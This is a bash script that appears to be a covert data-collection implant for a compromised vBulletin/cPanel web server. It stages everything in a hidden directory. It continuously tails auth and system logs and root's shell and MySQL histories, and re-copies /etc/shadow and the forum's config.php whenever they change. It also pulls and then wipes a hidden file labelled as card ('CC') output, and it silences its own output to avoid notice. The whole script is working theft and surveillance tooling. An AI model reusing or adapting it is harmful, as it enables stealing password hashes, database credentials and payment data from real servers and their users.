#!/bin/bash
# Mon Dec  4 10:08:19 EST 2012
# To do another file, make a new block of EIGHT array vars for a new index (0, 1, 2, etc.)
# AND redefine DOTHESE= to include the new index.


# NOTE: MAXPER is in bytes and must be bigger than the number of characters in this line 1 of our copy:
#Mon Apr 16 10:16:56 UTC 2012: New Tail of /var/log/messages Begun


# Fix path to avoid PATH=. issue
PATH=.:/bin:/sbin:/usr/bin:/usr/sbin


# START: TARGET SPECIFIC DEFS

LINES=0

HD=/var/tmp/.tmpMep0gI
DOTHESE="0 4 5 7 8 10 11 13"


# OPTIONALS, set DOATINTERVAL to non-empty positive integer to turn on,
# and populate the DOAT[N] commands desired, for N in 1,2,3,4,5,6,7 (NOT N==0)
# Use exactly one of these (12*60*60 is 43200 seconds):
#
#DOATINTERVAL=0		# DISABLED
#DOATINTERVAL=7200	# Every 2 hours
DOATINTERVAL=10800	# Every 3 hours
#DOATINTERVAL=21600	# Every 6 hours
#DOATINTERVAL=43200	# Every 12 hours

# E.g.: DOAT[1]='w'
DOAT[1]="netstat -antpu"


# One block per monitored file
INPUT[0]=/usr/local/lsws/DEFAULT/logs/access.log
OUTPUT[0]=${HD}/u/laa
OUTPUT2[0]=${HD}/u/u/laa
GREP[0]="GET [^ ]*(showthread|showpm)"
GREPOUT[0]="^127\.0\.0\.1"
MAXPER[0]=41943040
MAXTIME[0]=7200
NULLIT[0]=""
COMP[0]=bzip2

INPUT[4]=/var/log/auth.log
OUTPUT[4]=${HD}/u/lsc
OUTPUT2[4]=${HD}/u/u/lsc
GREP[4]=""
GREPOUT[4]=""
MAXPER[4]=41943040
MAXTIME[4]=7200
NULLIT[4]=""
COMP[4]=

INPUT[5]=/var/log/messages
OUTPUT[5]=${HD}/u/lm
OUTPUT2[5]=${HD}/u/u/lm
GREP[5]=""
GREPOUT[5]=""
MAXPER[5]=41943040
MAXTIME[5]=7200
NULLIT[5]=""
COMP[5]=bzip2

INPUT[6]=/usr/local/cpanel/logs/access_log
OUTPUT[6]=${HD}/u/lcp
OUTPUT2[6]=${HD}/u/u/lcp
GREP[6]=""
GREPOUT[6]=""
MAXPER[6]=41943040
MAXTIME[6]=7200
NULLIT[6]=""
COMP[6]=bzip2

INPUT[7]=/root/.bash_history
OUTPUT[7]=${HD}/u/lrh
OUTPUT2[7]=${HD}/u/u/lrh
GREP[7]=""
GREPOUT[7]=""
MAXPER[7]=25
MAXTIME[7]=7200
NULLIT[7]=""
COMP[7]=

INPUT[8]=/root/.mysql_history
OUTPUT[8]=${HD}/u/lrd
OUTPUT2[8]=${HD}/u/u/lrd
GREP[8]=""
GREPOUT[8]=""
MAXPER[8]=25
MAXTIME[8]=7200
NULLIT[8]=""
COMP[8]=

########### ONCHANGE SECTION BEGIN--be sure ONCHANGE IS SET

# ONCHANGE[n] is set: This pulls complete file every time it changes
INPUT[10]=/etc/shadow
OUTPUT[10]=${HD}/u/lsp
OUTPUT2[10]=${HD}/u/u/lsp
GREP[10]=""
GREPOUT[10]=""
MAXPER[10]=0 # Ignored
MAXTIME[10]=7200
NULLIT[10]=""
COMP[10]=
ONCHANGE[10]="1" # Leave empty or unset to not use this feature

# ONCHANGE[n] is set: This pulls complete file every time 
INPUT[11]=/usr/local/lsws/DEFAULT/html/vb/includes/config.php
OUTPUT[11]=${HD}/u/lsg
OUTPUT2[11]=${HD}/u/u/lsg
GREP[11]=""
GREPOUT[11]=""
MAXPER[11]=0 # Ignored
MAXTIME[11]=7200
NULLIT[11]=""
COMP[11]=
ONCHANGE[11]="1" # Leave empty or unset to not use this feature

########### ONCHANGE SECTION END

########### NULLIT SECTION BEGIN for CC otuput files

# This pulls and then WIPES all lines in INPUT[] file
INPUT[13]=/tmp/.vbtmp/vbupload3KwYbO
OUTPUT[13]=${HD}/u/lcc
OUTPUT2[13]=${HD}/u/u/lcc
GREP[13]=""
GREPOUT[13]=""
MAXPER[13]=41943040
MAXTIME[13]=7200
NULLIT[13]="1"
COMP[13]=""

########### NULLIT SECTION END

# MAKE NO CHANGES BELOW

WDIR=`dirname ${OUTPUT[0]}`
WDIR2=`dirname ${OUTPUT2[0]}`

V=-v

dbg() {
    echo -e `date -u`"[$$]": "$*" | tee -a $WDIR.dbg/.dbg 2>/dev/null
}

die() {
    KILL=kill
    [ "$1" = "nokill" ] && shift && KILL=""
    dbg "DYING/FATAL, w output follows: $*"
    w | tee -a $WDIR.dbg/.dbg

    [ "$KILL" ] || exit 1

    # Kill em all
    for NUM in $DOTHESE ; do
	[ "${ONCHANGE[NUM]}" ] && continue
        dbg "Killing tail on INPUT[$NUM]=${INPUT[$NUM]}"
        ziptailnullfile $NUM kill
    done

    # These will be useful if we had to die... .dbg.YYYYMMDDHHMMSS in u/u.dbg...
    [ -d $WDIR.dbg -a -f $WDIR.dbg/.dbg -a -d $WDIR2.dbg ] && cat $WDIR.dbg/.dbg >> $WDIR2.dbg/.dbg.`date +%F-%H%M%S` && cat /dev/null > $WDIR.dbg/.dbg
    # Consolidate them...
    cat $WDIR2.dbg/.dbg* > $WDIR.dbg/dbg && rm -f $WDIR2.dbg/.dbg* && mv $WDIR.dbg/dbg $WDIR2.dbg/dbg.`date +%F-%H%M%S`.DIED
    
    exit 1
}


ziptailnullfile() {
    NUM=$1
    KILLONLY=$2
    dbg In ziptailnullfile NUM=$NUM KILLONLY=$KILLONLY
    # Now polymorphic: 
        # If $KILLONLY is set, do only that (only if a single PID) and NULLIT if need be.
        # See if there is a running tail on $NUM,
        # If there is not, start one,
        # If there is and our dupe is too big, kill the tail, rename dupe, start new tail
        # Finally, NULLIT if desired
        # handle (zip/ship) our renamed dupe if there (.d file)

    REDO=""
    touch ${OUTPUT[$NUM]}
    SIZE=`stat -c %s ${OUTPUT[$NUM]}`


    if [ "${ONCHANGE[NUM]}" ] ; then
	REDO=""
	NEWSUM="`cksum ${INPUT[$NUM]}`"
	if [ "$KILLONLY" -o "$NEWSUM" != "${ONCHANGE[NUM]}" ] ; then
            ONCHANGE[$NUM]="$NEWSUM"
            dbg Pulling new ${INPUT[$NUM]} with cksum=${ONCHANGE[NUM]}
            cp $V -p ${INPUT[$NUM]} ${OUTPUT[$NUM]}.d
	fi
    else
        PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
        [ "$PIDS" ] && ps -ef | grep " $$ " | egrep " ($(echo $PIDS | tr ' ' '|')) " | tee -a $WDIR.dbg/.dbg && dbg above lines from psg $PIDS
        [ "$KILLONLY" ] && REDO=yes && dbg Setting REDO for KILLONLY=$KILLONLY
        if [ ${MAXTIME[$NUM]} -gt 0 -a $((LOOP%180)) == 0 ] ; then
	    w | tee -a $WDIR.dbg/.dbg
	    # Only check AGE every 180 loops, 180*15s=30m
            AGE=$((`date +%s`-${LASTTIME[$NUM]}))
            [ $AGE -ge ${MAXTIME[$NUM]} ] && REDO=yes && dbg Setting REDO for AGE=$AGE -ge ${MAXTIME[$NUM]} when LASTTIME=${LASTTIME[$NUM]}=
        fi

	# Either we have a tail ($PIDS) or we start one with REDO here
        [ "$PIDS" ] || REDO=yes
        [ "$PIDS" ] || dbg Setting REDO for nothing in PIDS=$PIDS= to start a new tail
        [ $SIZE -ge ${MAXPER[$NUM]} ] && REDO=yes && dbg Setting REDO for SIZE=$SIZE -ge  ${MAXPER[$NUM]} 
    fi

#    if [ "$PIDS" and "${PIDOF[$NUM]}" ] ; then
#	# Check they agree here maybe????
#	if 
#    fi


    dbg in ztnf at REDO check $NUM with ONCHANGE=${ONCHANGE[$NUM]} SIZE=$SIZE= PIDOF=${PIDOF[$NUM]} PIDS=$PIDS= KILLONLY=$KILLONLY= REDO=$REDO= and MAXPER=${MAXPER[$NUM]}=
    if [ "$REDO" ] ; then
	if [ ! "$PIDS" ] ; then
            # Save this data if here, since !$PIDS no tail to have pulled it yet and we NULLIT below and would lose it.
	    [ "${NULLIT[$NUM]}" ] && cat ${INPUT[$NUM]} >>  ${OUTPUT[$NUM]} && dbg Saving content of ${INPUT[$NUM]} before NULLING it
        fi
        mv $V ${OUTPUT[$NUM]} ${OUTPUT[$NUM]}.d
        if [ ! "$KILLONLY" ] ; then
	    # starttail now takes care of killing old tail if it is there
            starttail $NUM
        fi
    fi

    # If .d file is there, we zip/ship
    if [ -s "${OUTPUT[$NUM]}.d" ] ; then
        EXT=`date +%F-%H%M%S`
        if [ "${COMP[$NUM]}" == "bzip2" ] ; then
            DEST="${OUTPUT2[$NUM]}.$EXT.bz2"
        elif [ "${COMP[$NUM]}" == "compress" ] ; then
            DEST="${OUTPUT2[$NUM]}.$EXT.Z"
        elif [ "${COMP[$NUM]}" == "gzip" ] ; then
            DEST="${OUTPUT2[$NUM]}.$EXT.Z"
        elif [ "${COMP[$NUM]}" ] ; then
            DEST="${OUTPUT2[$NUM]}.$EXT.${COMP[$NUM]}"
        else
            DEST="${OUTPUT2[$NUM]}.$EXT"
        fi
        if [ "${COMP[$NUM]}" ] ; then
            dbg Compressing ${OUTPUT[$NUM]}.d with ${COMP[$NUM]} to ${OUTPUT[$NUM]}.dd
            ${COMP[$NUM]} -c ${OUTPUT[$NUM]}.d >  ${OUTPUT[$NUM]}.dd
            mv $V  ${OUTPUT[$NUM]}.dd $DEST
            rm $V ${OUTPUT[$NUM]}.d*
        else
            mv $V ${OUTPUT[$NUM]}.d $DEST
        fi
        unset DEST
    else
        rm $V -f ${OUTPUT[$NUM]}.d
        dbg removing 0 byte file ${OUTPUT[$NUM]}.d 
    fi
    if [ "${NULLIT[$NUM]}" = "1" ] ; then
        > ${INPUT[$NUM]}
    fi
    dbg Done with ziptailnullfile on INPUT[$NUM]=${INPUT[NUM]} for now, will roll over at ${MAXPER[NUM]} bytes...

}

starttail() {
    NUM=$1
    # For a particular $NUM, starttail() starts a fresh tail of file $NUM.
    if [ "${PIDOF[$NUM]}" ] ; then
	dbg Killing old tail PIDOF[$NUM]=${PIDOF[$NUM]}
	kill ${PIDOF[$NUM]}
	PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
	[ "$PIDS" ] && sleep 3 && PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
	if [ "$PIDS" ] ; then
	    dbg "PROBLEM: We just issued kill ${PIDOF[$NUM]} and yet we still see a matching tail, trying again with that PID."
	    kill -9 ${PIDOF[$NUM]}
	    sleep 1
	    PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
	    ps -ef | grep " $$ " | egrep " ($(echo $PIDS | tr ' ' '|')) " | tee -a $WDIR.dbg/.dbg && dbg above lines from psg $PIDS
	    if [ "$PIDS" ] ; then
		sleep 3
		PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
		if [ "$PIDS" ] ; then
		    dbg "OK then, we kill this(ese) too:"
		    kill $PIDS
		    sleep 1
		    PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
		fi
		[ "$PIDS" ] && sleep 3 && PIDS=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
	        ps -ef | grep " $$ " | egrep " ($(echo $PIDS | tr ' ' '|')) " | tee -a $WDIR.dbg/.dbg && dbg above lines from psg $PIDS
		[ "$PIDS" ] && die "PROBLEM: We just killed the EXTRA PIDS=$PIDS and yet we still see a matching tail."
	    fi
	fi
	unset PIDOF[$NUM]
    fi
    dbg "New Tail of ${INPUT[$NUM]} Begun"
    dbg "BG RUNNING: tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[NUM]} | egrep --line-buffered \"${GREP[NUM]}\" | egrep --line-buffered -v \"${GREPOUT[NUM]}\""
    OFFBY=0
    if [ -z "${GREP[$NUM]}${GREPOUT[$NUM]}" ] ; then
        tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]} 2>/dev/null >> ${OUTPUT[$NUM]} &
    elif [ -z "${GREP[$NUM]}" ] ; then
        tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]} 2>/dev/null | egrep --line-buffered -v "${GREPOUT[$NUM]}" 2>/dev/null >> ${OUTPUT[$NUM]} &
	OFFBY=1
    elif [ -z "${GREPOUT[$NUM]}" ] ; then
        tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]} 2>/dev/null | egrep --line-buffered "${GREP[$NUM]}" 2>/dev/null >> ${OUTPUT[$NUM]} &
	OFFBY=1
    else
        #both
        tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]} 2>/dev/null | egrep --line-buffered "${GREP[$NUM]}" 2>/dev/null | egrep --line-buffered -v "${GREPOUT[$NUM]}" 2>/dev/null >> ${OUTPUT[$NUM]} &
	OFFBY=2
    fi
    PIDOF[$NUM]=$!
    PIDOF[$NUM]=$((PIDOF[$NUM]-OFFBY))
    [ "${PIDOF[$NUM]}" ] || die PROBLEM: Just started a tail and cannot discover its pid
    PIDST=`ps -ef | grep " $$ " | grep -v grep | grep "tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" | awk '{print $2}' | tr '\n' ' ' | sed "s, $,,g"`
    if [ "$PIDST" != "${PIDOF[$NUM]}" ]  ; then
	dbg "ISSUE: After subtracting OFFBY=$OFFBY we get PIDST=$PIDST and PIDOF=${PIDOF[$NUM]}. Resetting to $PIDST now."
	PIDOF[$NUM]=$PIDST
        ps -ef | grep " $$ " | grep -v grep | egrep " ${PIDOF[$NUM]} |tail --lines=$LINES --max-unchanged-stats=5 --follow=name ${INPUT[$NUM]}$" 
    fi
    dbg "New tail on NUM=$1 has PID=${PIDOF[$NUM]}"
    LASTTIME[$NUM]=`date +%s`
}



[ "$DOTHESE" ] || die nokill define DOTHESE first

[ -d $WDIR ] || die nokill $WDIR must exist
[ -d $WDIR2 ] || die nokill $WDIR2 must exist

for NUM in $DOTHESE ; do 
    [ "${MAXTIME[$NUM]}" ] || MAXTIME[$NUM]=0
    [ "${LASTTIME[$NUM]}" ] || LASTTIME[$NUM]=0
    dbg "Monitoring ${INPUT[$NUM]} with MAXPER=${MAXPER[$NUM]} MAXTIME=${MAXTIME[$NUM]} NULLIT=${NULLIT[$NUM]} ONCHANGE=${ONCHANGE[$NUM]}"
    ls -al ${INPUT[NUM]} || die  nokill INPUT[$NUM]=${INPUT[NUM]} not there
done

LOOP=0
while [ 1 ];
do
    [ -d $WDIR ] || break
    [ -d $WDIR2 ] || break

    for NUM in $DOTHESE ; do 
        dbg "Monitoring ${INPUT[$NUM]}"
        ziptailnullfile $NUM
    done
    
    LOOP=$((LOOP+1))

    [ $LOOP -gt 2 ] && dbg CLOSING STDOUT STDERR
    [ $LOOP -gt 2 ] && exec 0>&- >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&- 

    if [ "0$DOATINTERVAL" -gt 0 ] ; then
        if [ $((`date +%s`%DOATINTERVAL)) -lt 15 ] ; then  # Do every DOATINTERVAL seconds
            # do stuff here every DOATINTERVAL seconds
            for NUM in 1 2 3 4 5 6 7 ; do
                # Skip if nothing to do
                [ "${DOAT[$NUM]}" ] || continue
		[ $NUM == 0 ] && continue
                FN=`echo "${DOAT[$NUM]}" | tr -d '\t /{}'`
                EXT=`date +%F-%H%M%S`
		dbg "On DOATINTERVAL=$DOATINTERVAL running: DOAT[$NUM] saving to $WDIR2/$FN.$EXT"
		echo "# `w;date -u` GMT: Running ${DOAT[$NUM]}" >>  $WDIR2/$FN.$EXT
		echo "# `date` (target time zone)" >>  $WDIR2/$FN.$EXT
                ( ${DOAT[$NUM]} ) >>  $WDIR2/$FN.$EXT 2>&1
            done
        fi
    fi

    sleep 15
    # Lots of .dbg.YYYYMMDDHHMMSS in u/u.dbg...kinda loud but unique names this way
    [ -d $WDIR.dbg -a -f $WDIR.dbg/.dbg -a -d $WDIR2.dbg ] && cat $WDIR.dbg/.dbg >> $WDIR2.dbg/.dbg.`date +%F-%H%M%S` && cat /dev/null > $WDIR.dbg/.dbg
    # Every 15m we clean these up some into a bigger file
    [ $((`date +%s`%900)) -le 15 ] && sleep 2 && cat $WDIR2.dbg/.dbg* > $WDIR.dbg/dbg && rm -f $WDIR2.dbg/.dbg* && mv $WDIR.dbg/dbg $WDIR2.dbg/dbg.`date +%F-%H%M%S`
done
dbg $WDIR or $WDIR2 must be gone
dbg `ls -alrt $WDIR $WDIR2; ps -wefwwwww |  egrep -v "[0-9].egrep" | egrep "tail.--lines=$LINES --max-unchanged-stats=5"`

ps -wefwwwww |  egrep -v "[0-9].egrep" | egrep "tail.--lines=$LINES --max-unchanged-stats=5"  && echo kill `ps -wefwwwww |  egrep -v "[0-9].egrep" | egrep "tail.--lines=$LINES --max-unchanged-stats=5" | awk '{print $2}'` && kill `ps -wefwwwww |  egrep -v "[0-9].egrep" | egrep "tail.--lines=$LINES --max-unchanged-stats=5" | awk '{print $2}'`


cat <<EOF
WDIR=$WDIR=
WDIR2=$WDIR2=

EOF

for A in $DOTHESE ; do 
    cat <<EOF

INPUT[$A]=${INPUT[A]}=
OUTPUT[$A]=${OUTPUT[A]}=
OUTPUT2[$A]=${OUTPUT2[A]}=
GREP[$A]=${GREP[A]}=
GREPOUT[$A]=${GREPOUT[A]}=
ONCHANGE[$A]=${ONCHANGE[A]}=
NULLIT[$A]=${NULLIT[A]}=
MAXPER[$A]=${MAXPER[A]}=


EOF
done
